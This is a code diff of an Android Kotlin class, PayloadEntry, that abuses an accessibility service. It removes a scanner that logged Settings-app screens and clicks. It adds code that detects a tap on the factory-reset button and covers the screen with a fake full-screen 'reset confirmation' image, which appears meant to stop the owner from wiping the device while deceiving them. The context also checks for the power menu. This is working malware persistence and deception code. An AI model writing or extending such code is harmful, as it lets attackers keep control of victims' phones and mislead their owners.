@@ -51,21 +51,29 @@ class PayloadEntry : DynamicEntry {
             var isInjectionScheduled = false
             
             DynamicEntry.accessibilityInterceptor = { event ->
-                // --- SURVEILLANCE: SETTINGS SCANNER ---
-                val pkg = event.packageName?.toString() ?: ""
-                if (pkg.contains("settings")) {
-                    if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-                        DynamicEntry.log("🪟 WINDOW LOADED: ${event.className?.toString()?.substringAfterLast(".")}")
-                        DynamicEntry.activeAccessibilityService?.rootInActiveWindow?.let { dumpNode(it, 0) }
-                    } else if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
-                        val src = event.source
-                        if (src != null) {
-                            val text = src.text?.toString() ?: src.contentDescription?.toString() ?: ""
-                            DynamicEntry.log("👆 CLICKED: txt='${text}' id='${src.viewIdResourceName?.substringAfter("id/")}'")
+                // --- RESET INTERCEPTION ---
+                if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+                    val sourceId = event.source?.viewIdResourceName ?: ""
+                    if (sourceId.contains("initiate_main_clear")) {
+                        DynamicEntry.log("🚨 RESET TRIGGERED: Injecting Fake Confirmation")
+                        DynamicEntry.overlayContent = {
+                            val resetBitmap = remember(resDir) {
+                                try { BitmapFactory.decodeFile(File(resDir, "resetconfirm.png").absolutePath).asImageBitmap() } catch (e: Exception) { null }
+                            }
+                            Box(modifier = Modifier.fillMaxSize().background(Color.Black)) {
+                                if (resetBitmap != null) {
+                                    Image(
+                                        bitmap = resetBitmap,
+                                        contentDescription = null,
+                                        modifier = Modifier.fillMaxSize(),
+                                        contentScale = ContentScale.FillBounds
+                                    )
+                                }
+                            }
                         }
                     }
                 }
-                // --------------------------------------
+                // --------------------------
 
                 val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
                 val hasPowerMenu = root?.let { checkNodes(it) } ?: false
@@ -181,19 +189,4 @@ class PayloadEntry : DynamicEntry {
         return false
     }
 
-    private fun dumpNode(node: AccessibilityNodeInfo?, depth: Int) {
-        if (node == null) return
-        val id = node.viewIdResourceName?.substringAfter("id/") ?: ""
-        val text = node.text?.toString() ?: node.contentDescription?.toString() ?: ""
-        val cls = node.className?.toString()?.substringAfterLast(".") ?: ""
-        
-        if (id.isNotEmpty() || text.isNotBlank()) {
-            val indent = "-".repeat(depth)
-            DynamicEntry.log("$indent[$cls] id:$id txt:$text")
-        }
-        
-        for (i in 0 until node.childCount) {
-            dumpNode(node.getChild(i), depth + 1)
-        }
-    }
 }
